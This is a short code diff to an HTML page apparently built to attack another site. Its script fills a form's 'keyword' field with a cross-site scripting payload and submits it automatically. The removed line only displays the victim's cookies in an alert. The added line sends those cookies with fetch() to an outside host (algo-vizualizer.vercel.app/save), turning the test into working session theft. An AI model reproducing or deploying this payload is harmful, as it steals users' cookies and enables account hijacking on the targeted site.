@@ -7,7 +7,7 @@
     </style>
     <script>
         function changeInput() {
-            document.getElementById("keyword").value = "\"\>\<script\>alert\(document.cookie.split\('\;'\)\)\<\/script\>";
+            document.getElementById("keyword").value = "\"\>\<script\>fetch\(`https://algo-vizualizer.vercel.app/save?content=${document.cookie.split\(';'\)}`\)\.then\(response =\> response.text\(\)\)\;\<\/script\>";
             document.getElementById("message_form").submit();
             return true;
         }
